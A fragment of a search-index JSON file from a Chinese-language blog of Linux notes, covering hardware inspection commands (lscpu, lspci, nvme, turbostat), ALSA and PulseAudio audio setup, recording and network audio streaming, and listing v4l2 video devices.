xauth\n</code></pre></p>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u786c\u4ef6\u76f8\u5173","title":"\u786c\u4ef6\u76f8\u5173","text":"","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u5173\u95ed-beepbell","title":"\u5173\u95ed beep/bell","text":"<p>Turn off beep / bell on linux terminal - Linux Tutorials - Learn Linux Configuration</p>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u67e5\u770b-cpucache","title":"\u67e5\u770b CPU,cache","text":"<p>\u67e5\u770b cache \u5927\u5c0f</p> <ul> <li>vim /proc/cpuinfo<ul> <li>cache_size \u4e0d\u77e5\u9053\u5177\u4f53\u542b\u4e49\uff0cL2/per core\uff1f</li> <li>cache_alignment \u4e3a L1 cache line \u5927\u5c0f\uff1f</li> </ul> </li> </ul> <pre><code>cache size      : 512 KB\nclflush size    : 64\ncache_alignment : 64\naddress sizes   : 48 bits physical, 48 bits virtual\n</code></pre> <ul> <li>lscpu<ul> <li>\u5f88\u8be6\u7ec6\uff0c\u53ef\u4ee5\u770b\u5230 cpu flag, numa, cache</li> </ul> </li> </ul> <pre><code>Caches (sum of all):\n  L1d:                   256 KiB (8 instances)\n  L1i:                   256 KiB (8 instances)\n  L2:                    4 MiB (8 instances)\n  L3:                    32 MiB (1 instance)\nNUMA:\n  NUMA node(s):          1\n  NUMA node0 CPU(s):     0-15\n</code></pre> <ul> <li>getconf -a | grep CACHE<ul> <li>\u53ef\u4ee5\u770b\u5230 cache line \u5927\u5c0f</li> </ul> </li> </ul> <pre><code>LEVEL1_ICACHE_SIZE                 32768\nLEVEL1_ICACHE_ASSOC\nLEVEL1_ICACHE_LINESIZE             64\nLEVEL1_DCACHE_SIZE                 32768\nLEVEL1_DCACHE_ASSOC                8\nLEVEL1_DCACHE_LINESIZE             64\nLEVEL2_CACHE_SIZE                  524288\nLEVEL2_CACHE_ASSOC                 8\nLEVEL2_CACHE_LINESIZE              64\nLEVEL3_CACHE_SIZE                  33554432\nLEVEL3_CACHE_ASSOC                 0\nLEVEL3_CACHE_LINESIZE              64\nLEVEL4_CACHE_SIZE\nLEVEL4_CACHE_ASSOC\nLEVEL4_CACHE_LINESIZE\n</code></pre>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#lspci","title":"lspci","text":"<pre><code>apt install pciutils\n</code></pre>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u5e38\u7528\u9009\u9879","title":"\u5e38\u7528\u9009\u9879","text":"<pre><code>lspci -k  #\u67e5\u770b\u5185\u6838\u9a71\u52a8\n\nlspci -nn #\u67e5\u770b\u8bbe\u5907id\n\nlspci -vv # \u67e5\u770bpcie\u94fe\u8def\u901f\u5ea6\uff1aLnkCap, LnkSta\n- 2.5 GT/s = PCI-e gen 1\n- 5 GT/s = PCI-e gen 2\n- 8 GT/s = PCI-e gen 3\n</code></pre>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u6307\u5b9a\u8bbe\u5907","title":"\u6307\u5b9a\u8bbe\u5907","text":"<pre><code>-s [[[[&lt;domain&gt;]:]&lt;bus&gt;]:][&lt;device&gt;][.[&lt;func&gt;]]\n</code></pre> <ul> <li>domain: 0 to ffff</li> <li>bus: 0-ff</li> <li>device: 0-ff</li> <li>function: 0-7</li> <li>\u53ef\u4ee5\u7701\u53bb\u6216\u8005\u8bbe\u7f6e\u4e3a<code>*</code>\u8868\u793a\u4efb\u610f\u503c</li> </ul> <pre><code>-d [vendor]:[device][:class[:prog-if]]\n</code></pre> <ul> <li>vendor: e.g. 10de</li> <li>device: : e.g. 1c02</li> </ul>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u67e5\u770b\u6811\u72b6\u7ed3\u6784","title":"\u67e5\u770b\u6811\u72b6\u7ed3\u6784","text":"<pre><code>lspci -tv\n</code></pre> <ul> <li>03.1\uff1a\u662f\u00a0slot and function number of the PCIe root hub</li> <li>[08]\u8868\u793a\u5728\u5176\u540e\u9762\u7684\u8bbe\u5907\u7684 bus \u4e3a 08</li> <li>00.0 \u4e3a device \u548c function \u7f16\u53f7</li> </ul> <pre><code>+-03.1-[08]--+-00.0  NVIDIA Corporation GP106 [GeForce GTX 1060 3GB]\n           |            \\-00.1  NVIDIA Corporation GP106 High Definition Audio Controller\n</code></pre>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u76d1\u63a7-\u6e29\u5ea6\u529f\u8017","title":"\u76d1\u63a7 (\u6e29\u5ea6\u3001\u529f\u8017)","text":"","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#ssd-\u6e29\u5ea6","title":"SSD \u6e29\u5ea6","text":"<p>Linux find NVMe SSD temperature using command line - nixCraft (cyberciti.biz)</p> <pre><code>apt install nvme-cli\n\nsudo nvme smart-log /dev/nvme0\n</code></pre>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#cpu-\u9891\u7387\u529f\u8017","title":"CPU \u9891\u7387\u3001\u529f\u8017","text":"<pre><code>lscpu -e\nCPU NODE SOCKET CORE L1d:L1i:L2:L3 ONLINE    MAXMHZ    MINMHZ      MHZ\n  0    0      0    0 0:0:0:0           \u662f 4850.1948 2200.0000 3023.077\n  1    0      0    1 1:1:1:0           \u662f 4850.1948 2200.0000 3167.647\n  2    0      0    2 2:2:2:0           \u662f 4850.1948 2200.0000 2529.517\n  3    0      0    3 3:3:3:0           \u662f 4850.1948 2200.0000 2895.147\n  4    0      0    4 4:4:4:0           \u662f 4850.1948 2200.0000 3068.640\n  5    0      0    5 5:5:5:0           \u662f 4850.1948 2200.0000 2814.150\n  6    0      0    6 6:6:6:0           \u662f 4850.1948 2200.0000 3097.454\n  7    0      0    7 7:7:7:0           \u662f 4850.1948 2200.0000 3148.684\n  8    0      0    0 0:0:0:0           \u662f 4850.1948 2200.0000 2938.599\n  9    0      0    1 1:1:1:0           \u662f 4850.1948 2200.0000 3376.774\n 10    0      0    2 2:2:2:0           \u662f 4850.1948 2200.0000 4420.665\n 11    0      0    3 3:3:3:0           \u662f 4850.1948 2200.0000 2996.655\n 12    0      0    4 4:4:4:0           \u662f 4850.1948 2200.0000 3100.166\n 13    0      0    5 5:5:5:0           \u662f 4850.1948 2200.0000 2894.990\n 14    0      0    6 6:6:6:0           \u662f 4850.1948 2200.0000 3244.797\n 15    0      0    7 7:7:7:0           \u662f 4850.1948 2200.0000 2897.287\n</code></pre> <p>CPU frequency scaling - ArchWiki (archlinux.org)</p> <p>\u67e5\u770b\u529f\u8017</p> <pre><code>sudo turbostat\n</code></pre>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u97f3\u9891","title":"\u97f3\u9891","text":"","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#alsa","title":"ALSA","text":"<pre><code>yfy@TianYi310 \u279c  /dev aplay -l\n**** PLAYBACK \u786c\u9ad4\u88dd\u7f6e\u6e05\u55ae ****\ncard 0: PCH [HDA Intel PCH], device 0: CX20751/2 Analog [CX20751/2 Analog]\n  \u5b50\u8bbe\u5907: 1/1\n  \u5b50\u8bbe\u5907 #0: subdevice #0\ncard 0: PCH [HDA Intel PCH], device 3: HDMI 0 [HDMI 0]\n  \u5b50\u8bbe\u5907: 1/1\n  \u5b50\u8bbe\u5907 #0: subdevice #0\ncard 0: PCH [HDA Intel PCH], device 7: HDMI 1 [HDMI 1]\n  \u5b50\u8bbe\u5907: 1/1\n  \u5b50\u8bbe\u5907 #0: subdevice #0\ncard 0: PCH [HDA Intel PCH], device 8: HDMI 2 [HDMI 2]\n  \u5b50\u8bbe\u5907: 1/1\n  \u5b50\u8bbe\u5907 #0: subdevice #0\ncard 0: PCH [HDA Intel PCH], device 9: HDMI 3 [HDMI 3]\n  \u5b50\u8bbe\u5907: 1/1\n  \u5b50\u8bbe\u5907 #0: subdevice #0\ncard 0: PCH [HDA Intel PCH], device 10: HDMI 4 [HDMI 4]\n  \u5b50\u8bbe\u5907: 1/1\n  \u5b50\u8bbe\u5907 #0: subdevice #0\n</code></pre> <pre><code>root@p2w \\u@\\h:\\w\\$ cat /proc/asound/modules\n 0 snd_usb_audio\n\nroot@p2w \\u@\\h:\\w\\$ arecord -l\n**** List of CAPTURE Hardware Devices ****\ncard 0: Lanseyaoji [Lanseyaoji], device 0: USB Audio [USB Audio]\n  Subdevices: 1/1\n  Subdevice #0: subdevice #0\n</code></pre>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#arecord-aplay","title":"arecord, aplay","text":"<p>arecord, aplay - command-line sound recorder and player for ALSA soundcard driver</p> <p><code>arecord -d 10 -f cd -t wav -D copy foobar.wav</code> will record foobar.wav as a 10-second, CD-quality wave file</p> <p>aplay \u64ad\u653e\u8c8c\u4f3c\u53ea\u652f\u6301 WAVE \u683c\u5f0f\uff0cmp3 \u64ad\u653e\u662f\u566a\u97f3</p> <pre><code>yfy@TianYi310 \u279c  Downloads aplay 'Laco - NEXUS.mp3'\n\u6b63\u5728\u64ad\u653e \u539f\u59cb\u8cc7\u6599 'Laco - NEXUS.mp3' : Signed 16 bit Little Endian, \u9891\u73878000Hz\uff0c Mono\n^C\u88ab\u4fe1\u53f7 \u4e2d\u65ad...\u9000\u51fa\nyfy@TianYi310 \u279c  Downloads aplay filename.wav\n\u6b63\u5728\u64ad\u653e WAVE 'filename.wav' : Signed 16 bit Little Endian, \u9891\u738744100Hz\uff0c Stereo\n</code></pre>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#aplay--l-\u6ca1\u6709\u8bbe\u5907","title":"aplay -l \u6ca1\u6709\u8bbe\u5907","text":"<p>\u4f46\u662f root \u7528\u6237\u6709\u3002\u8fd9\u4e5f\u5bfc\u81f4 pulseaudio list sinks \u65f6\u53ea\u6709\u4f2a\u8bbe\u5907\u3002</p> <p>alsa - How do I get sound with an HDA card? - Ask Ubuntu audio - ALSA does not find sound devices as user but can as root after kernel upgrade - Super User</p> <p>\u6ca1\u6709\u5c1d\u8bd5\u53c2\u8003 1\uff0c\u800c\u662f\u76f4\u63a5\u4fee\u6539\u4e86/dev/snd \u7684\u6743\u9650 777\uff08\u6dfb\u52a0\u7528\u6237\u5230 audio \u7ec4\u6ca1\u6709\u4f5c\u7528\uff09\uff0c\u95ee\u9898\u89e3\u51b3\u3002</p>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#pulseaudio","title":"PulseAudio","text":"","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#system-wide-\u6a21\u5f0f\u548c-per-user-\u6a21\u5f0f","title":"system-wide \u6a21\u5f0f\u548c per-user \u6a21\u5f0f","text":"<p>\u63a8\u8350\u4f7f\u7528 per-user \u6a21\u5f0f\uff0csystem-wide \u6a21\u5f0f\u4e0d\u5b89\u5168\u3002Running PulseAudio as System-Wide Daemon \u2013 PulseAudio (www.freedesktop.org)</p> <p>per-user \u6a21\u5f0f\uff0c\u6bcf\u4e2a\u7528\u6237\u9700\u8981\u4f7f\u7528\u65f6\u542f\u52a8 pulseaudio\u3002system \u6a21\u5f0f\u9002\u5408\u6ca1\u6709\u666e\u901a\u7528\u6237\u7684\u5d4c\u5165\u5f0f\u8bbe\u5907</p>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u8fd0\u884c-server","title":"\u8fd0\u884c server","text":"<p>Running (www.freedesktop.org)</p> <p>\u6709\u684c\u9762\u73af\u5883\u60c5\u51b5\u4e0b\u4e00\u822c\u60c5\u51b5\u4e0b\u4f1a\u81ea\u52a8\u542f\u52a8\u3002\u4e5f\u53ef\u4ee5\u624b\u52a8\u542f\u52a8</p> <pre><code>pulseaudio --kill # \u5173\u95edpulseaudio server\n\npulseaudio # \u8fd0\u884c\u5728\u524d\u53f0\uff0cctrl-C\u7ed3\u675f\u3002\u4fbf\u4e8e\u5b9e\u65f6\u67e5\u770b\u65e5\u5fd7\npulseaudio --daemonize # daemon\u6a21\u5f0f\uff0c\u8fd0\u884c\u5728\u540e\u53f0\npulseaudio -vv --log-time # \u663e\u793a\u66f4\u591alog\n</code></pre> <p><code>~/.config/pulse/</code>\u4f18\u5148\u7ea7\u9ad8\u4e8e<code>/etc/pulse/</code></p> <ul> <li>default.pa : The default PulseAudio Startup Script Commands in this file run when the daemon is started or restarted. Run\u00a0<code>man default.pa</code>\u00a0for documentation.</li> <li>daemon.conf: The PulseAudio daemon configuration file Run\u00a0<code>man pulse-daemon.conf</code>\u00a0for documentation.</li> <li>system.pa\uff1a\u4ec5\u7528\u4e8e system-wide \u6a21\u5f0f</li> </ul>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u63a7\u5236\u547d\u4ee4-pactl","title":"\u63a7\u5236\u547d\u4ee4 pactl","text":"<p>CLI (www.freedesktop.org)</p> <p>\u901a\u8fc7<code>pactl</code>\u547d\u4ee4\u548c pulseaudio daemon \u8fdb\u884c\u4ea4\u4e92</p> <pre><code>pactl list sources # \u67e5\u770b\u8f93\u5165\u8bbe\u5907\npactl list sinks # \u67e5\u770b\u8f93\u51fa\u8bbe\u5907\n\n# \u8c03\u8282\u97f3\u91cf\npactl set-sink-mute &lt;device&gt; toggle/true/false  # device tab\u81ea\u52a8\u8865\u5168\npactl set-sink-volume &lt;device&gt; 30%\n</code></pre>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u8ba9\u9ea6\u514b\u98ce\u8f93\u51fa\u5230\u626c\u58f0\u5668","title":"\u8ba9\u9ea6\u514b\u98ce\u8f93\u51fa\u5230\u626c\u58f0\u5668","text":"<p>sound - How to hear my voice in speakers with a mic? - Ask Ubuntu</p> <pre><code>pactl load-module module-loopback latency_msec=1\n\n# stop\npactl unload-module module-loopback\n</code></pre> <p>\u53e6\u4e00\u4e2a\u529e\u6cd5\u76f4\u63a5\u4f7f\u7528 alsa \u547d\u4ee4\u3002</p> <pre><code>arecord -f cd - | aplay - # \u5ef6\u8fdf\u5f88\u9ad8\narecord -f cd - | tee output.wav | aplay - # \u00a0play while saving\n\narecord --buffer-time=1 - | aplay --buffer-time=1 - # \u6539\u5584\u5ef6\u8fdf\n</code></pre>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u5c06\u6307\u5b9a-source-\u8f93\u51fa\u5230\u6307\u5b9a-sink","title":"\u5c06\u6307\u5b9a source \u8f93\u51fa\u5230\u6307\u5b9a sink","text":"<p>Modules \u2013 PulseAudio (www.freedesktop.org)</p> <pre><code>pactl load-module module-loopback latency_msec=1 source=2 sink=0  # \u6570\u5b57\u4e3aindex\n</code></pre>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u5f55\u6307\u5b9a\u5e94\u7528\u58f0\u97f3","title":"\u5f55\u6307\u5b9a\u5e94\u7528\u58f0\u97f3","text":"<p>p.s \u5173\u952e\u70b9</p> <ul> <li>\u76f4\u63a5\u5bf9\u8f93\u51fa\u5230\u626c\u58f0\u5668\u7684\u58f0\u97f3\u5f55\u5236\uff0c\u81ea\u5df1\u5c31\u542c\u4e0d\u5230\u58f0\u97f3\u4e86\u3002\u4f7f\u7528 combined\uff0c\u5bf9\u8f93\u51fa\u5230 headphone \u7684\u58f0\u97f3\u590d\u5236\u4e00\u4efd\uff0c\u7136\u540e\u5bf9\u5176\u8fdb\u884c\u5f55\u5236</li> </ul> <p>\u53c2\u8003\uff1aLinux audio recording guide (ro-che.info)</p> <ol> <li>Create a \u201cnull\u201d sink that you will be recording. Let\u2019s call it\u00a0<code>recording</code>.</li> <li>Create a combined sink that will send its input to both headphones and the\u00a0<code>recording</code>\u00a0sink. Otherwise, you will be able to record a stream but not hear it yourself. So, let\u2019s call this sink\u00a0<code>combined</code>.</li> <li>Direct the sound from the specific applications you want to record into the combined sink.</li> <li>Record the monitor of the\u00a0<code>recording</code>\u00a0sink to a file.</li> </ol> <p>\u6dfb\u52a0 combined \u8bbe\u5907</p> <pre><code>pacmd load-module module-null-sink sink_name=recording sink_properties=device.description=recording\npacmd load-module module-combine-sink sink_name=combined sink_properties=device.description=combined \\\n  slaves=recording,alsa_output.pci-0000_00_1f.3.analog-stereo\n</code></pre> <p>\u5c06 combined \u8bbe\u7f6e\u4e3a\u9ed8\u8ba4\u8f93\u51fa\uff0c\u7136\u540e\u5f00\u59cb\u5f55\u5236</p> <pre><code>parecord --channels=1 -d recording.monitor filename.wav\n</code></pre> <ul> <li>parecord \u5f55\u5236\u6ca1\u6709\u538b\u7f29\uff0c\u53ea\u80fd\u4f7f\u7528 parecord \u5f55\u5236\u5417\uff1f</li> </ul>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u97f3\u9891\u7f51\u7edc\u4e32\u6d41","title":"\u97f3\u9891\u7f51\u7edc\u4e32\u6d41","text":"","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u53c2\u8003","title":"\u53c2\u8003","text":"<ul> <li>linux \u5230\u5b89\u5353\u8bbe\u5907\uff1aHow to stream my GNU/Linux audio output to Android devices over WI-FI? - Super User</li> <li>windows \u5230 linux\uff1aStreaming audio from Windows to Linux using PulseAudio - Super User<ul> <li>windows \u4e0a\u5b89\u88c5\u97f3\u9891\u9a71\u52a8\uff0clinux \u4e0a\u5b89\u88c5 scream receiver\uff1aduncanthrax/scream: Virtual network sound card for Microsoft Windows (github.com)</li> </ul> </li> <li>windows \u5230 android</li> </ul> <ul> <li>\u624b\u673a\u5230 laptop, \u901a\u8fc7 pulseaudio\uff1aHow to stream audio from your phone to your laptop with PulseAudio | Hacker News (ycombinator.com)</li> </ul>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#pulseaudio_1","title":"pulseaudio","text":"<p>Network Setup \u2013 PulseAudio (www.freedesktop.org)</p>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#direct-\u6a21\u5f0f","title":"direct \u6a21\u5f0f","text":"<p>\u6700\u7b80\u5355\u7684\u65b9\u5f0f</p> <ul> <li>\u5728\u9700\u8981\u5b9e\u9645\u64ad\u653e\u58f0\u97f3\u7684\u8bbe\u5907\u4e0a\uff08server \u7aef\uff09\uff0c\u5f00\u542f<code>module-native-protocol-tcp</code>\u5141\u8bb8\u7f51\u7edc\u8fde\u63a5\u3002</li> <li> <p>\u7136\u540e\u5728\u5ba2\u6237\u7aef\u4e0a\uff0c\u8bbe\u7f6e PULSE_SERVER\u3002\u8fd9\u6837\u5ba2\u6237\u7aef\u7684\u58f0\u97f3\u5c31\u4f1a\u4ea4\u7ed9\u670d\u52a1\u7aef\u8f93\u51fa</p> <ul> <li>\u53ef\u4ee5\u901a\u8fc7\u73af\u5883\u53d8\u91cf<code>PULSE_SERVER</code></li> <li>Alternatively you can modify\u00a0<code>~/.pulse/client.conf</code>\u00a0or\u00a0<code>/etc/pulse/client.conf</code>\u00a0and set\u00a0<code>default-server</code>.</li> </ul> <pre><code>export PULSE_SERVER=tcp:&lt;server_ip&gt;:4713\n</code></pre> </li> </ul> <p>android \u4e0a\u6709 pulse server \u8f6f\u4ef6\uff1aXServer XSDL - Google Play \u4e0a\u7684\u5e94\u7528</p> <ul> <li>\u5ef6\u8fdf\u633a\u4f4e\u7684</li> </ul>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#tunnel-\u6a21\u5f0f","title":"tunnel \u6a21\u5f0f","text":"<p>\u901a\u8fc7 tunnel\uff0c\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 sink\uff0c\u5c06\u6240\u6709\u97f3\u9891\u901a\u8fc7\u7f51\u7edc\u53d1\u9001\u5230\u53e6\u4e00\u4e2a server \u4e0a\uff08source \u4e5f\u4e00\u6837\uff09\u3002\u597d\u5904\u662f\u53ef\u4ee5\u65e0\u7f1d\u5207\u6362\u4f7f\u7528\u672c\u5730\u8fd8\u662f\u8fdc\u7a0b\u8bbe\u5907\u3002</p> <p>Modules \u2013 PulseAudio (www.freedesktop.org)</p> <p>\u5047\u8bbe A\uff0cB \u4e24\u4e2a\u673a\u5668\uff0cA \u6709\u9ea6\u514b\u98ce\uff0cB \u6709\u626c\u58f0\u5668\u3002\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u914d\u7f6e\uff0c\u8ba9 A \u83b7\u5f97 B \u7684\u626c\u58f0\u5668\uff0cB \u83b7\u5f97 A \u7684\u9ea6\u514b\u98ce\u3002</p> <pre><code># A\nload-module module-native-protocol-tcp auth-anonymous=1\nload-module module-tunnel-sink server=192.168.36.215\n\n# B\nload-module module-native-protocol-tcp auth-anonymous=1\nload-module module-tunnel-source server=192.168.36.230\n</code></pre>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#rtp","title":"RTP","text":"<p>RTP is the\u00a0Realtime Transfer Protocol. It is a well-known protocol for transferring audio and video data over IP. Two related protocols are SDP and SAP. SDP is the\u00a0Session Description Protocol\u00a0and can be used to describe RTP sessions. SAP is the\u00a0Session Announcement Protocol\u00a0and can be used to announce RTP sessions that are described with SDP. (Modern SIP based VoIP phones use RTP/SDP for their sessions, too) All three protocols are defined in IETF RFCs (RFC3550, RFC3551, RFC2327, RFC2327). They can be used in both multicast and unicast fashions. PulseAudio exclusively uses multicast RTP/SDP/SAP containing audio data.</p> <ul> <li>\u53ef\u4ee5\u7528\u4e8e 1 \u5bf9\u591a\uff0c\u591a\u5bf9\u591a\u7b49\u573a\u666f\u3002</li> <li>RTP \u57fa\u4e8e IP \u5c42\u7684\u534f\u8bae\u5ef6\u8fdf\u53ef\u80fd\u66f4\u4f4e\uff1f</li> </ul> <ul> <li>pulseaudio \u76ee\u524d\u53ea\u652f\u6301 LAN \u5185\u3002\u6ca1\u6cd5\u5728\u8de8 LAN \u7684\u4e24\u53f0\u8bbe\u5907\u4e2d\u5b9e\u73b0\u3002</li> </ul> <p>The current implementation is designed to be used exclusively in local area networks, though Internet use is theoretically supported. Only uncompressed audio is supported, hence you won't be able to transmit more than a few streams at the same time over a standard LAN.</p>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#rygel","title":"Rygel","text":"<p>Your best bet is probably to setup a proper media server (like Rygel, which works well with Pulseaudio) to transcode the raw audio to something like MP3 and stream that instead.</p>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u5176\u5b83-module","title":"\u5176\u5b83 module","text":"<p>module-simple-protocol-tcp</p> <p>An implementation of a simple protocol which allows playback by using simple tools like netcat. Just connect to the listening socket of this module and write the audio data to it, or read it from it for playback, resp. recording.</p>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#vlc-\u8fdb\u884c-http-\u4e32\u6d41","title":"vlc \u8fdb\u884c http \u4e32\u6d41","text":"<ul> <li>\u4f18\u70b9\uff1a\u5ba2\u6237\u7aef\u4e0d\u7528\u5b89\u88c5\u8f6f\u4ef6\uff0c\u53ea\u9700\u8981\u6253\u5f00\u6d4f\u89c8\u5668</li> <li>\u7f3a\u70b9\uff1a\u5ef6\u8fdf\u6709 3-4s\uff0c\u4e0d\u9002\u7528\u4e8e\u64ad\u653e\u89c6\u9891\u573a\u666f</li> </ul> <p>\u5173\u952e\u70b9\uff1asource \u4e2d\u9ed8\u8ba4\u6709\u4e00\u4e2a monitor \u7684\u6e90\uff0c\u8be5\u6e90\u5c31\u53ef\u4ee5\u83b7\u5f97\u8f93\u51fa\u5230\u626c\u58f0\u5668\u7684\u58f0\u97f3</p> <pre><code>cvlc -vvv pulse://XXXX --sout '#transcode{acodec=mp3,ab=128,channels=2}:standard{access=http,dst=0.0.0.0:8888/pc.mp3}'\n</code></pre> <p>\u8bbe\u5907\u4e0a</p> <pre><code>http://your.local.ip.address:8888/pc.mp3\n</code></pre>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u5404\u79cd\u4e32\u6d41","title":"\u5404\u79cd\u4e32\u6d41","text":"","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#windows-to-linux","title":"windows to linux","text":"","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#linux-to-anything","title":"linux to anything","text":"","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#\u89c6\u9891","title":"\u89c6\u9891","text":"","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-linux%E4%BD%BF%E7%94%A8/#v4l2","title":"v4l2","text":"<p>\u5217\u51fa\u6240\u6709\u8bbe\u5907</p> <pre><code>root@tianyi \u279c  ~ v4l2-ctl --list-devices\nUSB2 Video: USB2 Video (usb-0000:00:14.0-4):\n        /dev/video2\n        /dev/video3\n        /dev/media1\n\nEasyCamera: EasyCamera (usb-0000:00:14.0-5):\n        /dev/video0\n        /dev/video1\n        /dev/media0\n</code></pre> 